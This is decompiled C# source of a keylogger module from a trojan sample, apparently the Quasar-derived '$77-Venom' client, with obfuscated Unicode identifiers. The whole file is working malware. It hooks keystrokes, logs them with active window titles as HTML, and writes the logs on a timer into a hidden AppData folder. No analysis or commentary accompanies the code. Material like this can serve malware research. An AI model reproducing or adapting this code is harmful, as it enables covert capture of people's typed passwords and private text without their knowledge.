// Decompiled with JetBrains decompiler
// Type: xClient.Core.Utilities.Keylogger
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities
{
  public class Keylogger : IDisposable
  {
    public static Keylogger Instance;
    private readonly System.Timers.Timer _timerFlush;
    private StringBuilder _logFileBuffer;
    private List<Keys> _pressedKeys = new List<Keys>();
    private List<char> _pressedKeyChars = new List<char>();
    private string _lastWindowTitle;
    private bool _ignoreSpecialKeys;
    private IKeyboardMouseEvents _mEvents;

    public bool IsDisposed { get; private set; }

    public static string LogDirectory => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.ج狕䐘\uE4A7\u235F遼荛౨堩涾\uFFFD႒秂詝\u19DB\uE24C伪\uEA9D\u339F\uEF6B);

    public Keylogger(double flushInterval)
    {
      Keylogger.Instance = this;
      this._lastWindowTitle = string.Empty;
      this._logFileBuffer = new StringBuilder();
      this.Subscribe(\uF704銪躩ᚫ螷벇\uFFFD吩鞱崦\uAACD䫼골霪鵮翭鱧Û神㛥.ȇ\uE7CF륖\uE252걫콩ἕΆয়졜悗⁨얲垝\uF224\u26FEꕄ\uEFF8\uF3BC㥶());
      this._timerFlush = new System.Timers.Timer()
      {
        Interval = flushInterval
      };
      this._timerFlush.Elapsed += new ElapsedEventHandler(this.timerFlush_Elapsed);
      this._timerFlush.Start();
      this.WriteFile();
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (this.IsDisposed)
        return;
      if (disposing && this._timerFlush != null)
      {
        this._timerFlush.Stop();
        this._timerFlush.Dispose();
      }
      this.Unsubscribe();
      this.IsDisposed = true;
    }

    private void Subscribe(IKeyboardMouseEvents events)
    {
      this._mEvents = events;
      this._mEvents.ｬ\uF2C3ꝭ聈본쳶\u3378쐹캺0ᩓ\uE0FA\u1A7E嘏覧叶취\u24ABⱤ馩 += new KeyEventHandler(this.OnKeyDown);
      this._mEvents.\u0DD4\u280E뻦焿\u086C\uEB96姶扛謲眭\u4DB9\u2B1Eꏩῢ㹟쐼镅ᚾ\uE0EAᇂ += new KeyEventHandler(this.OnKeyUp);
      this._mEvents.眍ꋯ幺\uF746꺁彩\uE849ࢮ澧Ⴆ\u31DD൮轻䮏\uE47B艡䒗ᡪ隯뒨 += new KeyPressEventHandler(this.OnKeyPress);
    }

    private void Unsubscribe()
    {
      if (this._mEvents == null)
        return;
      this._mEvents.ｬ\uF2C3ꝭ聈본쳶\u3378쐹캺0ᩓ\uE0FA\u1A7E嘏覧叶취\u24ABⱤ馩 -= new KeyEventHandler(this.OnKeyDown);
      this._mEvents.\u0DD4\u280E뻦焿\u086C\uEB96姶扛謲眭\u4DB9\u2B1Eꏩῢ㹟쐼镅ᚾ\uE0EAᇂ -= new KeyEventHandler(this.OnKeyUp);
      this._mEvents.眍ꋯ幺\uF746꺁彩\uE849ࢮ澧Ⴆ\u31DD൮轻䮏\uE47B艡䒗ᡪ隯뒨 -= new KeyPressEventHandler(this.OnKeyPress);
      this._mEvents.Dispose();
    }

    private void OnKeyDown(object sender, KeyEventArgs e)
    {
      string input = 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD.ꠕ约ꮰ딘鼗톗媭\uEA87೨\u2CE6\u2A93ﴺⴊ扨逰黝ᣏৗ듍\uE122();
      if (!string.IsNullOrEmpty(input) && input != this._lastWindowTitle)
      {
        this._lastWindowTitle = input;
        this._logFileBuffer.Append("<p class=\"h\"><br><br>[<b>" + 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD.\u2E02ꃃ뼤빏㼏啚떯㗽몰蟇㪸灲\uE1C6뫠䝾\uFFFD刉ﻴ뛪\uE911(input) + " - " + DateTime.Now.ToString("HH:mm") + "</b>]</p><br>");
      }
      if (this._pressedKeys.IsModifierKeysSet() && !this._pressedKeys.Contains(e.KeyCode))
      {
        this._pressedKeys.Add(e.KeyCode);
      }
      else
      {
        if (e.KeyCode.IsExcludedKey() || this._pressedKeys.Contains(e.KeyCode))
          return;
        this._pressedKeys.Add(e.KeyCode);
      }
    }

    private void OnKeyPress(object sender, KeyPressEventArgs e)
    {
      if (this._pressedKeys.IsModifierKeysSet() && this._pressedKeys.ContainsKeyChar(e.KeyChar) || this._pressedKeyChars.Contains(e.KeyChar) && 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD.\uF542ᯠ峠෦笻槟먓\u09F4\u0FE9ⴰ\uF132Ὴ\u2469鴘พ\uF4A2屛齲簓僁(this._pressedKeyChars, e.KeyChar) || this._pressedKeys.ContainsKeyChar(e.KeyChar))
        return;
      string str = 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD.釈攽ژ眗ⱃ哤뻑\u2EAB\uFDD5\uFFFD\u19EB嫠钡\uE9CC舵\uEDD9㡪疵ﶏ\u26A0(e.KeyChar);
      if (string.IsNullOrEmpty(str))
        return;
      if (this._pressedKeys.IsModifierKeysSet())
        this._ignoreSpecialKeys = true;
      this._pressedKeyChars.Add(e.KeyChar);
      this._logFileBuffer.Append(str);
    }

    private void OnKeyUp(object sender, KeyEventArgs e)
    {
      this._logFileBuffer.Append(this.HighlightSpecialKeys(this._pressedKeys.ToArray()));
      this._pressedKeyChars.Clear();
    }

    private string HighlightSpecialKeys(Keys[] keys)
    {
      if (keys.Length < 1)
        return string.Empty;
      string[] strArray = new string[keys.Length];
      for (int index = 0; index < keys.Length; ++index)
      {
        if (!this._ignoreSpecialKeys)
        {
          strArray[index] = 拠\uFFFD鸅蜧鰺\uF6E1佅걂\u2A36\u28E2䌶ู\uE560\uF185䌿\uFFFD\uFFFDﺛ邏\uFFFD.縉薖ᩴ衪悚ạᮒ蕀霅敯쒜\uF1E0볯榮쯽ㅞꞰ鴵\u2A65툎(keys[index]);
        }
        else
        {
          strArray[index] = string.Empty;
          this._pressedKeys.Remove(keys[index]);
        }
      }
      this._ignoreSpecialKeys = false;
      if (this._pressedKeys.IsModifierKeysSet())
      {
        StringBuilder stringBuilder = new StringBuilder();
        int num = 0;
        for (int index = 0; index < strArray.Length; ++index)
        {
          this._pressedKeys.Remove(keys[index]);
          if (!string.IsNullOrEmpty(strArray[index]))
          {
            stringBuilder.AppendFormat(num == 0 ? "<p class=\"h\">[{0}" : " + {0}", (object) strArray[index]);
            ++num;
          }
        }
        if (num > 0)
          stringBuilder.Append("]</p>");
        return stringBuilder.ToString();
      }
      StringBuilder stringBuilder1 = new StringBuilder();
      for (int index = 0; index < strArray.Length; ++index)
      {
        this._pressedKeys.Remove(keys[index]);
        if (!string.IsNullOrEmpty(strArray[index]))
        {
          switch (strArray[index])
          {
            case "Return":
              stringBuilder1.Append("<p class=\"h\">[Enter]</p><br>");
              continue;
            case "Escape":
              stringBuilder1.Append("<p class=\"h\">[Esc]</p>");
              continue;
            default:
              stringBuilder1.Append("<p class=\"h\">[" + strArray[index] + "]</p>");
              continue;
          }
        }
      }
      return stringBuilder1.ToString();
    }

    private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
    {
      if (this._logFileBuffer.Length <= 0 || \u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting)
        return;
      this.WriteFile();
    }

    private void WriteFile()
    {
      bool flag = false;
      string str = Path.Combine(Keylogger.LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Keylogger.LogDirectory);
        if (!directoryInfo.Exists)
          directoryInfo.Create();
        if (鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.睡淧ᩭ\uE99F靾뺳큋㒺ꅌ괴풺ﮞ\uEBCE㿚䆮\u1BFD殶홓겶\uF715)
          directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        if (!File.Exists(str))
          flag = true;
        StringBuilder stringBuilder = new StringBuilder();
        if (flag)
        {
          stringBuilder.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
          stringBuilder.Append("<style>.h { color: 0000ff; display: inline; }</style>");
          this._lastWindowTitle = string.Empty;
        }
        if (this._logFileBuffer.Length > 0)
          stringBuilder.Append((object) this._logFileBuffer);
        \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.䨮\uABFA렟훠Қ\uF59Cግ潤폯섶눖岠닓츔跉\uECD6労ﾊਤ落(str, stringBuilder.ToString());
        stringBuilder.Clear();
      }
      catch
      {
      }
      this._logFileBuffer.Clear();
    }
  }
}
